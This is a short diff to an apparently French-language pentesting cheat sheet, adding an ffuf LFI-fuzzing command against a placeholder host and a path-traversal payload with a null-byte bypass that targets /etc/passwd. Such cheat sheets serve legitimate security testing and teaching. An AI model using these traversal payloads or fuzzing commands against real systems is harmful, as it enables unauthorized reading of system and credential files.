@@ -492,6 +492,7 @@ SSTI avec TWIG si {{7*'7'}}=49:
 Test de payload pour la découverte d'une LFI:  
 ```bash
 ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -u http://example.com/index.php?language=FUZZ
+ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://example.com/image?filename=FUZZ
 ```
 Classic Bypass LFI:
 ```bash
@@ -499,6 +500,7 @@ Classic Bypass LFI:
 ..././
 ....\/
 ....////
+../../etc/passwd%00.jpg
 #url encode sur burpsuite
 ./language/../../../
 ```
